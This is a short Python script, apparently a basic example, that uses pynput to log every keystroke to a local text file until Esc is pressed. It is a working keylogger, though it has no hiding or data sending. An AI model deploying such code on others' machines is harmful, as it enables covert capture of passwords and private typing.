from pynput import keyboard

def on_press(key):
    try:
        with open('keylogging.txt', 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open('keylogging.txt', 'a') as f:
            f.write(f'{key}')

def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener with Esc key
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()